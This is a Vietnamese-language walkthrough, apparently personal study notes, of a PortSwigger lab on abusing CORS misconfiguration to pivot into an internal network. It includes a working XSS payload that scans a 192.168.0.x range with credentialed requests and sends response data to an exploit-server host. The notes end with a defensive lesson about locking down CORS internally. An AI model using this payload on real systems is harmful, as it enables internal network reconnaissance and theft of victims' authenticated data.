![[cors-pivot.png]]
-mô tả lab: có server nội bộ `192.168.0.x` không ra internet được. Mình dùng XSS ở subdomain public để bắt browser victim đánh vào mạng nội bộ rồi đọc response qua CORS.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack

### hướng giải
- [ ] mình thấy lab cho 1 subdomain có XSS + 1 dải mạng nội bộ cần quét
- [ ] sau khi quan sát gói tin này, mình thấy server nội bộ cũng reflect Origin + credentials (CORS ẩu cả trong lẫn ngoài)
- [ ] nên mình chèn JS vào subdomain XSS, JS này quét `http://192.168.0.1:8080` -> `...254:8080`, con nào trả 200 thì đọc response forward về exploit-server

### giải
-bước 1: payload quét của mình nhúng vào chỗ XSS của subdomain:
```js
<script>
for (let i = 1; i < 255; i++) {
  let ip = 'http://192.168.0.' + i + ':8080/accountDetails';
  let req = new XMLHttpRequest();
  req.open('GET', ip, true);
  req.withCredentials = true;
  req.onload = function() {
    if (this.status == 200)
      location = 'https://exploit-LAB.exploit-server.net/log?ip=' + ip + '&data=' + encodeURIComponent(this.responseText);
  };
  try { req.send(); } catch(e) {}
}
</script>
```
![[cors-pivot-scan.png]]
-sau khi quan sát log này, mình thấy chỉ có 1 IP (vd `192.168.0.42`) trả về dữ liệu chứa API key. Còn lại fail hết.

-bước 2: lấy key submit là solve.

> [!NOTE]
> -bài học của mình: CORS ẩu ở server nội bộ còn nguy hiểm hơn ngoài public, vì attacker dùng browser victim làm bàn đạp quét mạng trong. Mạng nội bộ cũng phải whitelist CORS chuẩn.
